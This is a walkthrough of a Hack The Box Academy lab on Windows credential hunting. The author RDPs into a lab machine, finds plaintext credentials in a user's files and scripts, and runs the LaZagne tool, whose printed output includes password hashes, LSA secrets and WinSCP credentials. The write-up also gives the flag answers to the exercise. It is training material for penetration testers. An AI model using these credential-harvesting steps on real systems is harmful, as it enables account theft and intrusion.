### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Credential Hunting in Windows <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.202.99

RDP to 10.129.202.99 (ACADEMY-PWATTACKS-WIN10CHUNTING) with user "Bob" and password "HTB_@cademy_stdnt!"

---

### Question 1:
What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)

I'm gonna RDP into bob's box, and share a folder within the login so we can transfer things:
```diff
+ $ xfreerdp /v:10.129.202.99 /u:bob /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-830862/Desktop/sharon
```

Just by poking around in his windows history found a huge amount of useful information and even some credentials:

	Gitlab access code just in case I lose connectivity with our local Gitlab instance.
	3z1ePfGbjWPsTfCsZfjy
	   
	   
	   
	Switches via SSH      admin          WellConnected123
	DC via RDP            bwilliamson    P@55w0rd!
	
	
	
	# This ansible playbook is a work in progress. Its supposed to automate the process of configure router interfaces across our network. 
	- name: Configure Interfaces
	  hosts: Edge-Router
	  roles:
	    - juniper.junos
	  connection: local
	  vars_prompt:
	    - name: username
	      prompt: Junos Username
	      private: no 
	
	    - name: password
	      prompt: Junos password 
	      private: Yes
	  
	  tasks: 
	    - name: Checking NETCONF connectivity
	      wait_for:
	        host: "{ Edge-Router }"
	        port: "{ netconf_port }"
	        timeout: 5
	    - name: Configure Interfaces Status
	      user: "{ edgeadmin }"
	      passwd: "{ Edge@dmin123!} "
	# Need to finish configuring this task. I should probably read some books on ansible.
	  
	  
	  
	  
	  
	  Import-Module ActiveDirectory
	Import-Csv "C:\Users\bob\WorkStuff\NewUsers.csv" | ForEach-Object {
	 $userPrincipal = $_."samAccountName" + "@inlanefreight.local"
	New-ADUser -Name $_.Name `
	 -Path $_."ParentOU"
	 -SamAccountName $_."samAccountName" `
	 -UserPrincipalName $userPrincipal ` 
	 -AccountPassword (ConvertTo-SecureString "Inlanefreightisgreat2022" -AsPlainText -Force) `
	 -ChangePasswordAtLogon $true
	 -Enabled $true 
	Add-ADGroupMember "Domain Admins" $_."samAccountName";

But to be thorough, lets download the binary for LaZagne on our attack box, throw it on the shared drive and run it on the winbox. Keep in mind modern browsers and win defender will probably detect this on both ends, so you may have to whitelist.

I ended up putting the lazagne.exe in the root of C:\ and then opened a privileged cmd in that dir:
```diff
+ C:\>start LaZagne.exe all -vv
```

	|====================================================================|
	|                                                                    |
	|                        The LaZagne Project                         |
	|                                                                    |
	|                          ! BANG BANG !                             |
	|                                                                    |
	|====================================================================|
	
	[+] System masterkey decrypted for 4358d9f0-222f-4ed2-9d2c-c8e5071b6c84
	[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659
	[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
	[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
	[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9
	
	########## User: SYSTEM ##########
	
	------------------- Hashdump passwords -----------------
	
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
	bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
	
	------------------- Lsa_secrets passwords -----------------
	
	DPAPI_SYSTEM
	0000   01 00 00 00 C0 3A 4A 9B 2C 04 5E 54 55 43 F3 DC    .....:J.,.^TUC..
	0010   B9 C1 81 BB 17 D6 BD CE 50 B9 FA 0F D7 94 52 15    ........P.....R.
	0020   01 11 35 73 08 74 8F 7C A1 01 94 4A                ..5s.t.|...J
	
	NL$KM
	0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
	0010   E4 FE 18 4B 25 46 81 18 BF 23 F5 A3 2A E8 36 97    ...K%F...#..*.6.
	0020   6B A4 92 B3 A4 32 DE B3 91 17 46 B8 EC 63 C4 51    k....2....F..c.Q
	0030   A7 0C 18 26 E9 14 5A A2 F3 42 1B 98 ED 0C BD 9A    ...&..Z..B......
	0040   0C 1A 1B EF AC B3 76 C5 90 FA 7B 56 CA 1B 48 8B    ......v...{V..H.
	0050   32 B3 2C 95 2E 46 50 5A 46 F7 6E 53 66 FB DA 53    2.,..FPZF.nSf..S
	
	
	
	########## User: bob ##########
	
	------------------- Winscp passwords -----------------
	
	[+] Password found !!!
	URL: 10.129.202.64
	Login: ubuntu
	Password: FSadmin123
	Port: 22

Hot Doodly Dog, we can use this output to answer all the remaining questions.

🚩 found **WellConnected123**.

---

### Question 2:
What is the GitLab access code Bob uses? (Format: Case-Sensitive)

🚩 found **3z1ePfGbjWPsTfCsZfjy**.

---

### Question 3:
What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

hint: Try using the 3rd party tool discussed in the section. Consider ways to transfer that tool to the target.

🚩 found **ubuntu:FSadmin123**.

---

### Question 4:
What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)

hint: Sometimes automation can create security issues. Maybe Bob left some interesting scripts laying around.....

🚩 found **Inlanefreightis--edit--great2022**.

---

### Question 5:
What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

hint: Ansible sure is a powerful automation engine......

🚩 found **edgeadmin:Edge--edit--@dmin123!**.
